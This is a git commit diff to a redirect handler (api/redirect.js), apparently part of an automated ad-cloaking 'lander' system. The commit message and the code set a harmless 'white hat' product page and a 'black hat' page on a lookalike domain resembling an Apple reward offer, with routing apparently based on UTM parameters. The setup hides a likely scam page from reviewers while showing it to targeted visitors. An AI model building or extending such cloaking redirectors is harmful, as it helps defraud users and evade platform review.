203f590989e373aad89e6aff11d0b44a31c904c1
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-26 02:44:41 +0500

    chore: Update lander links (automated)
    White Hat: https://engel-natur.de/en/raglan-sweater-with-wooden-buttons-ivn-best/575411
    Black Hat: https://apppplerewad.lovable.app/
    
    Request ID: UWo4fPfofWD96KxtWGH2
    Allocated to: chkamran766@gmail.com
    Auto-release: 2025-11-26T21:44:41.247Z

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.myntra.com/watches/shocknshop/shocknshop-kids-printed-dial--led-backlight-analogue-multi-function-watch-wch327-/25528042/buy";
-    const blackPageURL = "https://luckystreak.lovable.app/";
+    const whitePageURL = "https://engel-natur.de/en/raglan-sweater-with-wooden-buttons-ivn-best/575411";
+    const blackPageURL = "https://apppplerewad.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
